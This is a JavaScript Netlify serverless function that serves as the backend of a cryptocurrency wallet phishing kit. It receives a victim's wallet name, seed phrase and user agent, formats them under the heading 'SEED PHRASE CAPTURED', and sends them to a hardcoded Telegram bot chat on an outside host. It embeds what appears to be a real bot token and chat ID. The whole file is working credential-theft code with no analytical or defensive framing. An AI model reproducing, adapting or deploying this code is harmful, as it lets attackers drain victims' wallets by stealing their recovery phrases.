// netlify/functions/send.js

exports.handler = async (event, context) => {
    // 🔐 ========== خصك تبدل التوكن والـ ID ديالك هنا ==========
    const BOT_TOKEN = "8806971313:AAGbvJjNLk1XEtCj4EsFgWp7mZLVHSXyCjU";
    const CHAT_ID = "7959451058";
    // 🔐 =======================================================
    
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST'
    };
    
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers, body: '' };
    }
    
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
    }
    
    try {
        const { seed, wallet, ua } = JSON.parse(event.body);
        
        if (!seed || !wallet) {
            return { statusCode: 400, headers, body: JSON.stringify({ error: 'Missing data' }) };
        }
        
        const message = `🔐 SEED PHRASE CAPTURED 🔐\n\n` +
                        `👛 Wallet: ${wallet}\n` +
                        `🔑 Seed: ${seed}\n` +
                        `🕒 Time: ${new Date().toISOString()}\n` +
                        `📱 UA: ${ua?.substring(0, 100) || 'unknown'}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({ success: true })
            };
        } else {
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ success: false, error: result.description })
            };
        }
        
    } catch (error) {
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ success: false, error: error.message })
        };
    }
};